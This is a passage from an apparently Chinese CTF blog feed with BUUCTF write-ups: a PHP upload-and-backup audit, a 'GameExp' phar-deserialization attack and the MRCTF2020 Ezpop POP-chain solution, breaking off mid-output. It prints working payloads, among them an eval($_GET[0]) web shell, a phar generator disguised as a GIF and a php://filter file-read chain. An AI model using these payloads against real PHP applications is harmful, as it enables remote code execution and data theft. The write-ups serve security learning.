class="line">$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php中实现了有一个类自动加载，可以以<code>http://ip/class/method</code>的形式去调用对应类的函数</p><p>//类自动加载</p><p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p><p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p><p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p><p>然后在<code>class</code>文件夹中有三个文件，分别为</p><p><code>home.class.php</code>、 <code>upload.class.php</code> 、<code>back.class.php</code>，分别对应主页、上传和备份功能的实现，接下来审计这三个文件</p><p>我们采用分而置之来分析</p><p>1.upload.class.php，上传功能</p><p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p><p>文件被上传到<code>profile</code>目录下，文件名可控，但是其后缀进行了限制，只能用txt，然后就是大小限制。</p><p>PHP in_array() 函数</p><p>定义和用法</p><p>in_array() 函数搜索数组中是否存在指定的值。</p><p><strong>注释：</strong>如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配已找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配未找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>echo “匹配已找到”</p><p>2.backup.class.php,备份功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span class="line">            $content&#x3D;htmlspecialchars(file_get_contents($filename),ENT_QUOTES);</span><br><span class="line">            $password&#x3D;$this-&gt;random_code();</span><br><span class="line">            $r[&#39;path&#39;]&#x3D;$this-&gt;_write($dest, $this-&gt;_create($password, $content));</span><br><span class="line">            $r[&#39;password&#39;]&#x3D;$password;</span><br><span class="line">            echo json_encode($r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;* 先验证保证为备份文件后,再保存为私藏文件 *&#x2F;</span><br><span class="line">    private function _write($dest, $content)&#123;</span><br><span class="line">        $f1&#x3D;$dest;</span><br><span class="line">        $f2&#x3D;&#39;private&#x2F;&#39;.$this-&gt;random_code(10).&quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">        $stream_f1 &#x3D; fopen($f1, &#39;w+&#39;);</span><br><span class="line">        fwrite($stream_f1, $content);</span><br><span class="line">        rewind($stream_f1);</span><br><span class="line">        $f1_read&#x3D;fread($stream_f1, 3000);</span><br><span class="line"></span><br><span class="line">        preg_match(&#39;&#x2F;^&lt;\?php \$_GET\[\&quot;password\&quot;\]&#x3D;&#x3D;&#x3D;\&quot;[a-zA-Z0-9]&#123;8&#125;\&quot;\?print\(\&quot;.*\&quot;\):exit\(\); $&#x2F;s&#39;, $f1_read, $matches);</span><br><span class="line"></span><br><span class="line">        if(!empty($matches[0]))&#123;</span><br><span class="line">            copy($f1,$f2);</span><br><span class="line">            fclose($stream_f1);   </span><br><span class="line">            return $f2;     </span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            fwrite($stream_f1, &#39;&lt;?php exit(); ?&gt;&#39;);</span><br><span class="line">            fclose($stream_f1);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function _create($password, $content)&#123;</span><br><span class="line">        $_content&#x3D;&#39;&lt;?php $_GET[&quot;password&quot;]&#x3D;&#x3D;&#x3D;&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;;</span><br><span class="line">        return $_content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function random_code($length &#x3D; 8,$chars &#x3D; null)&#123;</span><br><span class="line">        if(empty($chars))&#123;</span><br><span class="line">            $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $count &#x3D; strlen($chars) - 1;</span><br><span class="line">        $code &#x3D; &#39;&#39;;</span><br><span class="line">        while( strlen($code) &lt; $length)&#123;</span><br><span class="line">            $code .&#x3D; substr($chars,rand(0,$count),1);</span><br><span class="line">        &#125;</span><br><span class="line">        return $code;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序首先将<code>$filename</code>拼接到<code>profile/</code>，然后检测文件是否存在，若存在，将文件内容读出来进行html编码，然后生成一个随机的字符串作为读取文件内容的密码，</p><p>之后调用<code>_create()</code>函数，将密码和html编码后的文件内容，拼接到<code>&#39;&lt;?php $_GET[&quot;password&quot;]===&quot;&#39;.$password.&#39;&quot;?print(&quot;&#39;.$content.&#39;&quot;):exit(); &#39;</code>里，</p><p>之后调用<code>_write()</code>函数，将上面这段php代码写进<code>private</code>目录，然后对文件内容内容进行正则表达式的检测，若通过检测,将文件内容写进<code>$dest</code>，并复制一份到<code>$f2</code>，若没有通过检测，则在<code>$dest</code>中写入<code>&lt;?php exit(); ?&gt;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">理清程序大体流程后，大致的攻击思路就是上传一个txt的文件，然后再通过back生成php文件</span><br></pre></td></tr></table></figure><p>上传txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;eval($_GET[0])&#125;</span><br></pre></td></tr></table></figure><p>进行备份，生成php文件</p><p><img src="/2021/09/04/buu/20/image-20210905101422842.png" alt="image-20210905101422842"></p><p>执行参数0</p><p><img src="/2021/09/04/buu/20/image-20210905101726252.png" alt="image-20210905101726252"></p><h4 id="GameExp"><a href="#GameExp" class="headerlink" title="GameExp:"></a>GameExp:</h4><p>这题也是坑了很久啊</p><p>首先是为了在目录下生成phar文件</p><p>需要修改配置php.ini，找了好久才解决：</p><p><a href="https://blog.csdn.net/weixin_35835030/article/details/116174720">https://blog.csdn.net/weixin_35835030/article/details/116174720</a></p><p>创建createphar.php文件（这以后可以用作phar文件解题模板）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> $output = <span class="string">&#x27;eval($_REQUEST[0]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif⽂件头</span></span><br><span class="line">$o = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将⾃定义meta-data存⼊manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.jpg&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的⽂件</span></span><br><span class="line"><span class="comment">//签名⾃动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在有php.exe的目录下，执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php  createphar.php</span><br></pre></td></tr></table></figure><p>这时候目录下就会生成php.phar,然后重命名为php.gif</p><p>然后在register页面注册时上传该文件</p><p>注册名随意，这里我用lex</p><p><img src="/2021/09/04/buu/20/image-20210907174315906.png" alt="image-20210907174315906"></p><p>还可以验证一下是否上传成功</p><p><img src="/2021/09/04/buu/20/image-20210907174611006.png" alt="image-20210907174611006"></p><p>接着重新注册一次，并且要用抓包修改，用户名注意要用刚刚注册的，</p><p>来触发反序列化,在post增添命令</p><p><img src="/2021/09/04/buu/20/image-20210907175822286.png" alt="image-20210907175822286"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Novel&quot;&gt;&lt;a href=&quot;#Novel&quot; class=&quot;headerlink&quot; title=&quot;Novel:&quot;&gt;&lt;/a&gt;Novel:&lt;/h4&gt;&lt;p&gt;参考博客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/W4nder/p/1</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <link href="http://daweitech.github.io/2021/09/03/buu/19/"/>
    <id>http://daweitech.github.io/2021/09/03/buu/19/</id>
    <published>2021-09-03T07:48:25.000Z</published>
    <updated>2021-09-07T12:35:08.633Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00解题"><a href="#0x00解题" class="headerlink" title="0x00解题"></a>0x00解题</h4><p>借鉴博客</p><p><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260">MRCTF2020]Ezpop—序列化pop链_marsxu626的博客-CSDN博客</a></p><p><a href="https://www.cnblogs.com/karsa/p/12806945.html">https://www.cnblogs.com/karsa/p/12806945.html</a></p><p>这题主要是代码审计，还涉及到一个知识点：构造pop链</p><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来分而解析几个不同的类</p><p>1.Modifier类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;<span class="comment">//variable，变量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个我在把文件放进seay审计系统里跑的时候就跑出了</p><p>include文件包含漏洞，而者也是我们最后要达成的目的：</p><p>利用文件包含漏洞和php伪协议来读取flag文件</p><p>这里还有魔法方法<strong>__invoke</strong> ，当脚本尝试将对象调用为函数时触发，所以在脚本中要把Modifier类调用为函数。</p><p>2.Show类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到了这里的_wakeup()函数，在反序列化时一定会首先调用其函数，过滤了不老少关键字，但是像filter://伪协议却没有过滤。</p><p>而_toString把类当作字符串时触发</p><p>所以得出wakeup方法可以触发tostring方法</p><p>3.Test类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有魔法方法：<strong>__get</strong> 从不可访问的属性中读取数据会触发<br>会返回function作为函数调用。</p><p>思路得出：</p><p>​        首先反序列化函数，触发Show类中的wakeup方法，wakeup方法做字符串处理，触发tosring方法，如果将str实例化为Test，因为Test类中不含source属性，所以调用get方法，将function实例化为Modifier类，即可触发其中invoke方法，最终调用文件包含函数，读取flag.php</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;karsa&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show(<span class="string">&#x27;aaa&#x27;</span>);</span><br><span class="line">$a-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">$b = <span class="keyword">new</span> Show($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 